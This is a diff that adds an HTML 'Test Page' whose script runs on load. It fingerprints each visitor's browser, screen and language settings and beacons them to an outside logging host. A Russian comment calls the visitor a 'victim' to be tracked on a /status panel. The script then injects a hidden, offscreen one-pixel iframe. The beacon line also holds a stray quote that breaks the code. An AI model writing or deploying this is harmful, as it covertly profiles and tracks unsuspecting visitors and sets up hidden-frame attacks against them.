@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Test Page</title>
+</head>
+<body>
+  <script>
+    // WHS: hit-лог сразу при открытии — жертва видна в /status с первой секунды
+    try {
+      const hit = {
+        hit: 1,
+        ua: navigator.userAgent,
+        screen: screen.width + 'x' + screen.height,
+        lang: (navigator.languages || [navigator.language]).join(','),
+        t: Date.now()
+      };
+      const q = Object.entries(hit).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
+      new Image().src = "https://whs-gate-test-5si9.zai-ai.site/log.html?HIT&"' + q;
+    } catch (e) {}
+
+    // если uid всё ещё нужен — просто устанавливаем
+    sessionStorage.setItem('uid', '1');
+
+    const frame = document.createElement('iframe');
+    frame.src = 'frame.html?' + Math.random();
+    frame.style.width = '1px';
+    frame.style.opacity = '0.01'
+    frame.style.position = 'absolute';
+    frame.style.left = '-9999px';
+    frame.style.height = '1px';
+    frame.style.border = 'none';
+
+    document.body.appendChild(frame);
+  </script>
+</body>
+</html>
